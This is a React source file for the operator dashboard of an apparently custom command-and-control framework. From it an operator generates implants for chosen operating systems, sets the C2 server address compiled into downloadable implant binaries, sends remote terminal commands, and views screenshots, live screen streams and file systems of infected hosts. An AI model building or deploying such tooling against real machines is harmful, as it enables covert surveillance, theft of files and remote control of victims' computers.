import React, { useEffect, useState, useRef } from "react";
import Terminal from "../components/Terminal"; // Adjust path if needed
import DownloadOptionsModal from "../components/DownloadOptionsModal"; // Adjust path
import GenerateImplantOSModal from "./GenerateImplantOSModal.js"; // Adjust path
import ScreenshotViewer from "../components/ScreenshotViewer"; // Adjust path
import FileSystemExplorer from '../components/FileSystemExplorer'; // Adjust path if needed


const API_BASE = "/api";
const REFRESH_INTERVAL = 5000; // For general implant list
const SCREENSHOT_GALLERY_REFRESH_INTERVAL = 3000; // For gallery mode viewer polling
const SCREENSHOT_LIVESTREAM_REFRESH_INTERVAL = 1000; // For livestream mode viewer polling (1s)
const GLOBAL_C2_IP_KEY = 'dashboardGlobalC2IP';

// --- Notification Component ---
function Notification({ message, type, onClose, Icon: IconComponent }) {
  const isVisible = !!message;
  const baseStyle = "fixed top-5 right-5 p-4 rounded-lg shadow-xl text-white z-[200] flex items-center transition-all duration-300 ease-in-out transform";
  const typeStyle = type === 'success' ? 'bg-green-600' : type === 'error' ? 'bg-red-600' : 'bg-blue-600';
  const visibilityStyle = isVisible ? 'translate-x-0 opacity-100' : 'translate-x-full opacity-0';

  if (!isVisible && !message) return null;

  return (
    <div className={`${baseStyle} ${typeStyle} ${visibilityStyle}`} style={{ minWidth: '250px', maxWidth: '400px' }} role="alert">
      {IconComponent && <IconComponent type={type} />}{" "}
      <span className="flex-grow">{message}</span>
      <button
        onClick={onClose}
        className="ml-3 -mr-1 p-1 rounded-md hover:bg-white hover:bg-opacity-20 focus:outline-none flex-shrink-0"
        aria-label="Close"
      >
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={2} stroke="currentColor" className="w-5 h-5">
          <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
        </svg>
      </button>
    </div>
  );
}

// --- Default Icon for Notification ---
const DefaultIcon = ({ type }) => {
    if (type === 'success') {
      return (
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-6 h-6 mr-3 flex-shrink-0">
          <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
        </svg>
      );
    }
    if (type === 'error') {
      return (
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-6 h-6 mr-3 flex-shrink-0">
          <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v3.75m9-.75a9 9 0 11-18 0 9 9 0 0118 0zm-9 3.75h.008v.008H12v-.008z" />
        </svg>
      );
    }
    return null;
};
Notification.Icon = DefaultIcon;

// --- Delete Confirmation Modal ---
function DeleteConfirmationModal({ isOpen, onClose, onConfirm, implantToken }) {
    if (!isOpen) return null;
    return (
        <div
      className="fixed inset-0 bg-black bg-opacity-60 backdrop-blur-sm flex items-center justify-center p-4 z-[150]"
      onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}
    >
      <div className="bg-white rounded-lg shadow-xl p-6 w-full max-w-md transform transition-all">
        <div className="flex items-center justify-between mb-4">
            <h3 className="text-xl font-semibold text-gray-800">Confirm Deletion</h3>
            <button onClick={onClose} className="text-gray-400 hover:text-gray-600">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-6 h-6">
                <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
                </svg>
            </button>
        </div>
        <p className="text-gray-600 mb-6">
          Are you sure you want to delete implant <strong className="font-mono">{implantToken}</strong>?
          This action cannot be undone.
        </p>
        <div className="flex justify-end space-x-3">
          <button
            onClick={onClose}
            className="px-4 py-2 text-sm font-medium text-gray-700 bg-gray-100 rounded-md hover:bg-gray-200 focus:outline-none focus:ring-2 focus:ring-gray-300"
          >
            Cancel
          </button>
          <button
            onClick={onConfirm}
            className="px-4 py-2 text-sm font-medium text-white bg-red-600 rounded-md hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-opacity-50"
          >
            Delete
          </button>
        </div>
      </div>
    </div>
    );
}

// --- Helper to extract screenshot path from command output ---
const extractScreenshotPathFromCmdOutput = (output) => {
    if (typeof output !== 'string') return null;
    // Regex for "Screenshot saved to C2 server at: c2_screenshots/UUID/filename.png"
    const c2PathMatch = output.match(/Screenshot saved to C2 server at: (c2_screenshots\/[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}\/[a-zA-Z0-9_.-]+\.png)/);
    if (c2PathMatch && c2PathMatch[1]) {
        return c2PathMatch[1];
    }
    // Simpler regex if UUID format isn't strictly enforced in path (less specific)
    const simplerPathMatch = output.match(/Screenshot saved to C2 server at: (c2_screenshots\/[a-zA-Z0-9_-]+\/[a-zA-Z0-9_.-]+\.png)/);
    if (simplerPathMatch && simplerPathMatch[1]) {
        return simplerPathMatch[1];
    }
    return null;
};


function Dashboard() {
  const [implants, setImplants] = useState([]);
  const [selectedImplantForTerminal, setSelectedImplantForTerminal] = useState(null);
  const [notification, setNotification] = useState({ message: "", type: "success", show: false });
  const notificationTimeoutRef = useRef(null);
  const [isDeleteModalOpen, setIsDeleteModalOpen] = useState(false);
  const [implantToDelete, setImplantToDelete] = useState(null);
  const [isGenerateOSModalOpen, setIsGenerateOSModalOpen] = useState(false);
  const [selectedOSForGeneration, setSelectedOSForGeneration] = useState("windows");
  const [globalC2IP, setGlobalC2IP] = useState('');
  const [inputGlobalC2IP, setInputGlobalC2IP] = useState('');
  const [downloadModalData, setDownloadModalData] = useState({
    isOpen: false, implantToken: null, targetOS: null, defaultC2IP: '',
  });

  const [screenshotViewerState, setScreenshotViewerState] = useState({
    isOpen: false,
    implantId: null,
    screenshots: [], // Array of "c2_screenshots/..." paths
    initialPath: null, // Specific path to open in gallery mode
    mode: 'gallery', // 'gallery' or 'livestream'
  });
  const screenshotPollIntervalRef = useRef(null);

  const [fileExplorerState, setFileExplorerState] = useState({
  isOpen: false,
  implantId: null,
});

// Inside Dashboard function
const openFileExplorer = (implantToken) => {
  setFileExplorerState({ isOpen: true, implantId: implantToken });
};

const closeFileExplorer = () => {
  setFileExplorerState({ isOpen: false, implantId: null });
};
  const displayNotification = (message, type = "success", duration = 5000) => {
    if (notificationTimeoutRef.current) clearTimeout(notificationTimeoutRef.current);
    setNotification({ message, type, show: true });
    notificationTimeoutRef.current = setTimeout(() => setNotification(prev => ({ ...prev, show: false })), duration);
  };
  const closeNotification = () => {
    if (notificationTimeoutRef.current) clearTimeout(notificationTimeoutRef.current);
    setNotification(prev => ({ ...prev, show: false }));
  };

  useEffect(() => {
    const savedC2IP = localStorage.getItem(GLOBAL_C2_IP_KEY);
    if (savedC2IP) {
      setGlobalC2IP(savedC2IP);
      setInputGlobalC2IP(savedC2IP);
    }
    fetchImplants();
    const intervalId = setInterval(fetchImplants, REFRESH_INTERVAL);
    
    return () => {
      clearInterval(intervalId);
      if (notificationTimeoutRef.current) clearTimeout(notificationTimeoutRef.current);
      if (screenshotPollIntervalRef.current) clearInterval(screenshotPollIntervalRef.current);
    };
  }, []);

  const fetchImplants = async () => {
    const token = localStorage.getItem("token");
    try {
      const res = await fetch(`${API_BASE}/implants`, { headers: { Authorization: `Bearer ${token}` } });
      if (!res.ok) {
        const errorData = await res.json().catch(() => ({ error: "Failed to parse error" }));
        const msg = errorData.error || `Server error: ${res.status}`;
        if (res.status === 401) {
          displayNotification("Session expired. Please log in again.", "error", 3000);
          localStorage.removeItem("token");
          setTimeout(() => window.location.href = '/login', 3000);
        } else {
          console.error(`Error fetching implants: ${msg}`);
          // displayNotification(`Error fetching implants: ${msg}`, "error"); // Optional: notify user
        }
        return;
      }
      const data = await res.json();
      setImplants(data.implants || []);
    } catch (err) {
      console.error("Network error fetching implants:", err);
      // displayNotification("Network error fetching implants. Check console.", "error"); // Optional
    }
  };

  const handleGenerateImplantWithOS = async (targetOS) => {
    const token = localStorage.getItem("token");
    try {
      const res = await fetch(`${API_BASE}/generate-implant`, {
        method: "POST",
        headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json" },
        body: JSON.stringify({ target_os: targetOS }),
      });
      if (res.ok) {
        displayNotification(`Implant record for ${targetOS} generated successfully!`, "success");
        fetchImplants(); // Refresh the list
      } else {
        const data = await res.json().catch(() => ({})); // Try to parse error
        displayNotification(`Failed to generate implant: ${data.error || res.statusText}`, "error");
      }
    } catch (err) {
      displayNotification("Error generating implant. Check console.", "error");
      console.error("Generate implant error:", err);
    } finally {
      setIsGenerateOSModalOpen(false);
      setSelectedOSForGeneration("windows"); // Reset for next time
    }
  };
  
  const openDeleteConfirmation = (uniqueToken) => {
    setImplantToDelete(uniqueToken);
    setIsDeleteModalOpen(true);
  };
  const closeDeleteConfirmation = () => setIsDeleteModalOpen(false);

  const handleDeleteConfirmed = async () => {
    if (!implantToDelete) return;
    const token = localStorage.getItem("token");
    try {
      const res = await fetch(`${API_BASE}/implants/${implantToDelete}`, {
        method: "DELETE",
        headers: { Authorization: `Bearer ${token}` },
      });
      if (res.ok) {
        displayNotification("Implant deleted successfully.", "success");
        fetchImplants(); // Refresh list
        if (selectedImplantForTerminal === implantToDelete) setSelectedImplantForTerminal(null);
        if (screenshotViewerState.implantId === implantToDelete) closeScreenshotViewer(); // Close viewer if it was for this implant
      } else {
        const data = await res.json().catch(() => ({}));
        displayNotification(`Failed to delete implant: ${data.error || res.statusText}`, "error");
      }
    } catch (err) {
      displayNotification("Error deleting implant. Check console.", "error");
      console.error("Delete implant error:", err);
    } finally {
      closeDeleteConfirmation();
      setImplantToDelete(null);
    }
  };
  
  const handleSaveGlobalC2IP = () => {
    const trimmedC2IP = inputGlobalC2IP.trim();
    if (trimmedC2IP === "") {
        localStorage.removeItem(GLOBAL_C2_IP_KEY);
        setGlobalC2IP("");
        displayNotification("Default C2 IP cleared.", "success");
        return;
    }
    // Basic validation (you might want a more robust regex for FQDNs, IPs, and ports)
    const pattern = /^([a-zA-Z0-9.-]+|\[[0-9a-fA-F:]+\])(:\d{1,5})?$|^localhost(:\d{1,5})?$/;
    if (!pattern.test(trimmedC2IP)) {
        displayNotification("Invalid Default C2 IP or Hostname format. Examples: 192.168.1.100, yourdomain.com, 10.0.0.5:8080, [::1]:443, localhost:8000", "error");
        return;
    }
    localStorage.setItem(GLOBAL_C2_IP_KEY, trimmedC2IP);
    setGlobalC2IP(trimmedC2IP);
    displayNotification("Default C2 IP saved successfully!", "success");
  };
  
  const openDownloadOptionsModal = (implantTokenToDownload) => {
    const implant = implants.find(imp => imp.unique_token === implantTokenToDownload);
    if (implant) {
      setDownloadModalData({
        isOpen: true,
        implantToken: implant.unique_token,
        targetOS: implant.target_os,
        defaultC2IP: globalC2IP, // Pass the currently saved global C2 IP
      });
    } else {
      displayNotification("Error: Could not find implant details to configure download.", "error");
    }
  };
  const closeDownloadOptionsModal = () => {
    setDownloadModalData({ isOpen: false, implantToken: null, targetOS: null, defaultC2IP: '' });
  };

  const performConfiguredDownload = async (implantTokenForAPI, targetOSForFilename, c2IP) => {
    const authToken = localStorage.getItem("token");
    const endpoint = `${API_BASE}/implants/${implantTokenForAPI}/download-configured`;
    try {
      const res = await fetch(endpoint, {
        method: "POST",
        headers: { Authorization: `Bearer ${authToken}`, "Content-Type": "application/json" },
        body: JSON.stringify({ c2_ip: c2IP }),
      });
      if (!res.ok) {
        const errorData = await res.json().catch(() => null); // Try to parse error JSON
        const errorMessage = errorData?.error || `Server error: ${res.status} ${res.statusText}`;
        throw new Error(errorMessage);
      }
      const blob = await res.blob();
      let filename = `implant_${implantTokenForAPI}_${targetOSForFilename}`; // Default filename
      const contentDisposition = res.headers.get('content-disposition');
      if (contentDisposition) {
        const filenameMatch = contentDisposition.match(/filename="?(.+?)"?(;|$)/i);
        if (filenameMatch && filenameMatch[1]) filename = filenameMatch[1];
      } else if (targetOSForFilename === "windows") filename += ".exe"; // Add .exe for Windows if not in header
      
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      a.remove();
      window.URL.revokeObjectURL(url);
      displayNotification(`Downloading: ${filename}`, "success");
    } catch (err) {
      displayNotification(`Download failed: ${err.message}`, "error");
      console.error("Download error:", err);
    } finally {
      closeDownloadOptionsModal();
    }
  };

  const handleOpenTerminal = (uniqueToken) => setSelectedImplantForTerminal(uniqueToken);
  const handleCloseTerminal = () => setSelectedImplantForTerminal(null);

  const getStatusColor = (status) => {
    switch (status?.toLowerCase()) {
      case 'online': return 'bg-green-100 text-green-800';
      case 'offline': return 'bg-red-100 text-red-800';
      case 'new': return 'bg-blue-100 text-blue-800';
      default: return 'bg-gray-100 text-gray-800';
    }
  };

  // Helper function to send commands from dashboard (for start/stop stream)
  const sendDashboardCommand = async (implantId, commandStr) => {
    const token = localStorage.getItem("token");
    try {
        const res = await fetch(`${API_BASE}/send-command`, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ implant_id: implantId, command: commandStr }),
        });
        const responseData = await res.json().catch(() => ({}));
        if (res.ok) {
            displayNotification(`Command '${commandStr}' sent to ${implantId} (ID: ${responseData.command_id || 'N/A'}).`, "success");
            return true;
        } else {
            displayNotification(`Failed to send command '${commandStr}': ${responseData.error || res.statusText || 'Unknown error'}`, "error");
            return false;
        }
    } catch (error) {
        displayNotification(`Error sending command '${commandStr}': ${error.message}`, "error");
        console.error(`Send command error (${commandStr}):`, error);
        return false;
    }
  };

  // --- Screenshot Viewer Logic ---
  const fetchScreenshotsForImplant = async (implantIdToFetchFor) => {
    if (!implantIdToFetchFor) return []; // Guard clause
    const token = localStorage.getItem("token");
    try {
      const res = await fetch(`${API_BASE}/implants/${implantIdToFetchFor}/screenshots`, {
        headers: { Authorization: `Bearer ${token}` },
      });

      if (!res.ok) {
        const errorData = await res.json().catch(() => ({ error: "Failed to parse error" }));
        console.error(`Failed to fetch screenshots for implant ${implantIdToFetchFor}: ${res.status} - ${errorData.error || res.statusText}`);
        return screenshotViewerState.screenshots; // Return current state's screenshots on error to avoid clearing them
      }

      const data = await res.json(); // Expected: { screenshots: ScreenshotInfo[] }
      const screenshotPaths = (data.screenshots || [])
        .map(info => info.url_path) // e.g., "c2_screenshots/implant-id/file.png"
        .filter(path => !!path && typeof path === 'string' && path.startsWith('c2_screenshots/'));

      return screenshotPaths; // These should be sorted newest first by C2

    } catch (error) {
      console.error(`Error fetching screenshot list for implant ${implantIdToFetchFor}:`, error);
      return screenshotViewerState.screenshots; // Return current on network or parsing error
    }
  };
  
  // Effect for polling screenshots when viewer is open and active
  useEffect(() => {
    if (screenshotViewerState.isOpen && screenshotViewerState.implantId) {
      const pollScreenshots = async () => {
        if (document.hidden) return; // Don't poll if tab is not visible or active

        const newPaths = await fetchScreenshotsForImplant(screenshotViewerState.implantId);
        
        setScreenshotViewerState(prev => {
          // Critical check: ensure the poll is for the currently active viewer state
          if (!prev.isOpen || prev.implantId !== screenshotViewerState.implantId || prev.mode !== screenshotViewerState.mode) {
            return prev; // State changed (e.g., viewer closed, different implant), stale poll
          }
          // Only update if paths actually changed to prevent unnecessary re-renders
          if (JSON.stringify(newPaths) !== JSON.stringify(prev.screenshots)) {
            // console.log(`Updating screenshots for ${prev.implantId} in ${prev.mode} mode. Count: ${newPaths.length}`);
            return { ...prev, screenshots: newPaths };
          }
          return prev; // No change in paths
        });
      };

      pollScreenshots(); // Initial poll when viewer opens or params (implantId/mode) change

      const intervalTime = screenshotViewerState.mode === 'livestream' 
        ? SCREENSHOT_LIVESTREAM_REFRESH_INTERVAL 
        : SCREENSHOT_GALLERY_REFRESH_INTERVAL;
      
      screenshotPollIntervalRef.current = setInterval(pollScreenshots, intervalTime);
    }

    return () => { // Cleanup: clear interval when viewer closes or relevant state changes
      if (screenshotPollIntervalRef.current) {
        clearInterval(screenshotPollIntervalRef.current);
        screenshotPollIntervalRef.current = null;
      }
    };
    // Dependencies ensure this effect re-runs if isOpen, implantId, or mode changes for the viewer
  }, [screenshotViewerState.isOpen, screenshotViewerState.implantId, screenshotViewerState.mode]);


  const openScreenshotViewer = async (implantIdToView, initialPath = null, mode = 'gallery') => {
    // Fetch initial set of screenshots immediately before opening
    const paths = await fetchScreenshotsForImplant(implantIdToView);

    setScreenshotViewerState({
      isOpen: true,
      implantId: implantIdToView,
      screenshots: paths,
      // For livestream, initialPath should always point to the newest if available (paths[0])
      // For gallery, use provided initialPath or default to newest if not provided/invalid
      initialPath: (mode === 'livestream' || !initialPath || !paths.includes(initialPath)) && paths.length > 0 ? paths[0] : initialPath,
      mode: mode,
    });
    // The useEffect hook for polling will automatically start based on the new state.
  };

  const closeScreenshotViewer = () => {
    // The ScreenshotViewer's internal onStreamStopRequested will be called on its unmount/close if needed.
    // The polling useEffect will clear its interval when isOpen becomes false.
    setScreenshotViewerState({ isOpen: false, implantId: null, screenshots: [], initialPath: null, mode: 'gallery' });
  };

  // Handler for when ScreenshotViewer requests a stream stop (e.g., on its close)
  const handleStreamStopRequested = async (implantIdToStop) => {
    if (implantIdToStop) {
      await sendDashboardCommand(implantIdToStop, "livestream_stop");
      displayNotification(`Livestream stop command automatically sent for ${implantIdToStop}.`, "info");
    }
  };

  // Button handler for the "Screenshots" button (opens in gallery mode)
  const handleViewScreenshotsButton = (implantToken) => {
    openScreenshotViewer(implantToken, null, 'gallery');
  };

  // Button handler for "Start Stream"
  const handleStartStreamButton = async (implantToken) => {
    const success = await sendDashboardCommand(implantToken, "livestream_start");
    if (success) {
      // Open viewer in livestream mode immediately after sending command
      openScreenshotViewer(implantToken, null, 'livestream');
    }
  };
  
  // "Stop Stream" button is removed from table; handled by ScreenshotViewer close

  return (
    <>
      <Notification
        message={notification.show ? notification.message : ""}
        type={notification.type}
        onClose={closeNotification}
        Icon={Notification.Icon}
      />
      <DeleteConfirmationModal
        isOpen={isDeleteModalOpen}
        onClose={closeDeleteConfirmation}
        onConfirm={handleDeleteConfirmed}
        implantToken={implantToDelete}
      />
      <DownloadOptionsModal
        isOpen={downloadModalData.isOpen}
        onClose={closeDownloadOptionsModal}
        onConfirm={performConfiguredDownload}
        implantToken={downloadModalData.implantToken}
        targetOS={downloadModalData.targetOS}
        defaultC2IP={downloadModalData.defaultC2IP}
      />
      <GenerateImplantOSModal
        isOpen={isGenerateOSModalOpen}
        onClose={() => setIsGenerateOSModalOpen(false)}
        onConfirm={handleGenerateImplantWithOS}
        selectedOS={selectedOSForGeneration}
        setSelectedOS={setSelectedOSForGeneration}
      />

      <ScreenshotViewer
        isOpen={screenshotViewerState.isOpen}
        onClose={closeScreenshotViewer}
        implantId={screenshotViewerState.implantId}
        screenshots={screenshotViewerState.screenshots}
        initialScreenshotPath={screenshotViewerState.initialPath}
        mode={screenshotViewerState.mode}
        onStreamStopRequested={handleStreamStopRequested} // Pass the handler
      />

      {fileExplorerState.isOpen && fileExplorerState.implantId && (
        <FileSystemExplorer
          implantID={fileExplorerState.implantId}
          onClose={closeFileExplorer}
          displayNotification={displayNotification} 
        />
      )}

      <div className="container mx-auto p-4 md:p-6 bg-gray-100 min-h-screen">
        <div className="bg-white shadow-xl rounded-lg p-6">
          <div className="flex flex-col md:flex-row justify-between items-start mb-6">
            <div className="flex-grow mb-4 md:mb-0">
              <h2 className="text-2xl md:text-3xl font-bold text-gray-800 mb-4">
                Implant Dashboard
              </h2>
              <button
                onClick={() => setIsGenerateOSModalOpen(true)}
                className="bg-indigo-600 text-white px-5 py-2.5 rounded-lg hover:bg-indigo-700 transition-colors shadow-md focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-opacity-50"
              >
                Generate Implant
              </button>
            </div>
            <div className="p-4 border border-gray-200/75 rounded-lg bg-slate-50 shadow-md w-full max-w-md">
              <h3 className="text-base font-semibold text-gray-700 mb-1">
                Default C2 Server
              </h3>
              <p className="text-xs text-gray-500 mb-3">
                Set a default IP or hostname for downloads.
              </p>
              <div className="flex flex-col sm:flex-row sm:items-end sm:space-x-2">
                <div className="flex-grow mb-2 sm:mb-0">
                  <label htmlFor="global_c2_ip" className="sr-only">
                    IP Address / Hostname
                  </label>
                  <input
                    type="text"
                    id="global_c2_ip"
                    value={inputGlobalC2IP}
                    onChange={(e) => setInputGlobalC2IP(e.target.value)}
                    placeholder="C2 IP or Hostname (e.g., 1.2.3.4:8080)"
                    className="w-full px-2.5 py-1.5 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-1 focus:ring-indigo-500 focus:border-indigo-500 text-xs text-gray-900 transition-shadow duration-150 hover:shadow"
                  />
                </div>
                <button
                  onClick={handleSaveGlobalC2IP}
                  className="w-full sm:w-auto px-3 py-1.5 text-xs font-medium text-white bg-indigo-600 rounded-md hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-1 focus:ring-offset-slate-50 transition-colors duration-150 ease-in-out shadow hover:shadow-md whitespace-nowrap"
                >
                  Save C2
                </button>
              </div>
              {globalC2IP && (
                <p className="mt-2 text-xs text-gray-600">
                  Current:{" "}
                  <strong className="font-mono bg-indigo-100 text-indigo-600 px-1 py-0.5 rounded-sm">
                    {globalC2IP}
                  </strong>
                </p>
              )}
              {!globalC2IP && (
                <p className="mt-2 text-xs text-gray-500 italic">
                  No default C2 set.
                </p>
              )}
            </div>
          </div>

          {implants.length === 0 && (
            <p className="text-gray-500 text-center py-10">
              No implants found. Generate one to get started!
            </p>
          )}

          {implants.length > 0 && (
            <div className="overflow-x-auto shadow-md rounded-lg">
              <table className="w-full border-collapse text-left">
                <thead className="bg-gray-200">
                  <tr>
                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider">
                      #
                    </th>
                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider">
                      Token
                    </th>
                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider">
                      OS
                    </th>
                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider">
                      Status
                    </th>
                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider">
                      Last Seen
                    </th>
                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider">
                      IP Address
                    </th>
                    <th className="p-3 text-sm font-semibold text-gray-700 uppercase tracking-wider text-center">
                      Actions
                    </th>
                  </tr>
                </thead>
                <tbody className="bg-white divide-y divide-gray-200">
                  {implants.map((implant, index) => (
                    <tr
                      key={implant.unique_token}
                      className="hover:bg-gray-50 transition-colors"
                    >
                      <td className="p-3 text-sm text-gray-700 whitespace-nowrap">
                        {index + 1}
                      </td>
                      <td className="p-3 text-sm text-gray-700 font-mono whitespace-nowrap">
                        {implant.unique_token}
                      </td>
                      <td className="p-3 text-sm text-gray-700 whitespace-nowrap capitalize">
                        {implant.target_os || "N/A"}
                      </td>
                      <td className="p-3 text-sm text-gray-700 whitespace-nowrap">
                        <span
                          className={`px-2.5 py-0.5 inline-flex text-xs leading-5 font-semibold rounded-full ${getStatusColor(
                            implant.status
                          )}`}
                        >
                          {implant.status || "N/A"}
                        </span>
                      </td>
                      <td className="p-3 text-sm text-gray-700 whitespace-nowrap">
                        {implant.status?.toLowerCase() === "new" ||
                        !implant.last_seen
                          ? "Never"
                          : new Date(implant.last_seen).toLocaleString()}
                      </td>
                      <td className="p-3 text-sm text-gray-700 whitespace-nowrap">
                        {implant.ip_address || "N/A"}
                      </td>
                      <td className="p-3 text-sm text-gray-700 whitespace-nowrap text-center">
                        <div className="flex flex-wrap justify-center items-center gap-1">
                          <button
                            className="bg-sky-500 text-white px-3 py-1.5 rounded-md hover:bg-sky-600 transition-colors text-xs font-medium"
                            onClick={() =>
                              handleOpenTerminal(implant.unique_token)
                            }
                            title="Open terminal"
                          >
                            Terminal
                          </button>
                          <button
                            className="bg-teal-500 text-white px-3 py-1.5 rounded-md hover:bg-teal-600 transition-colors text-xs font-medium"
                            onClick={() =>
                              handleViewScreenshotsButton(implant.unique_token)
                            }
                            title="View all screenshots for this implant"
                          >
                            Screenshots
                          </button>

                          <button
                            className="bg-purple-500 text-white px-3 py-1.5 rounded-md hover:bg-purple-600 transition-colors text-xs font-medium"
                            onClick={() =>
                              handleStartStreamButton(implant.unique_token)
                            }
                            title="Start Livestream Feed and Open Viewer"
                          >
                            Start Stream
                          </button>

                          <button
                            className="bg-cyan-600 text-white px-3 py-1.5 rounded-md hover:bg-cyan-700 transition-colors text-xs font-medium"
                            onClick={() =>
                              openFileExplorer(implant.unique_token)
                            }
                            title="Open File Explorer"
                          >
                            File Explorer
                          </button>

                          <button
                            className="bg-yellow-500 text-white px-3 py-1.5 rounded-md hover:bg-yellow-600 transition-colors text-xs font-medium"
                            onClick={() =>
                              openDownloadOptionsModal(implant.unique_token)
                            }
                            title="Download implant"
                          >
                            Download
                          </button>
                          <button
                            className="bg-red-600 text-white px-3 py-1.5 rounded-md hover:bg-red-700 transition-colors text-xs font-medium"
                            onClick={() =>
                              openDeleteConfirmation(implant.unique_token)
                            }
                            title="Delete implant"
                          >
                            Delete
                          </button>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>

        {selectedImplantForTerminal && (
          <div
            className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center p-4 z-[100] backdrop-blur-sm"
            onClick={(e) => {
              if (e.target === e.currentTarget) handleCloseTerminal();
            }}
          >
            <Terminal
              implantID={selectedImplantForTerminal}
              onClose={handleCloseTerminal}
              openScreenshotViewer={openScreenshotViewer} // Pass for terminal to open screenshot viewer
              extractScreenshotPathFromCmdOutput={
                extractScreenshotPathFromCmdOutput
              }
            />
          </div>
        )}
      </div>
    </>
  );
}

export default Dashboard;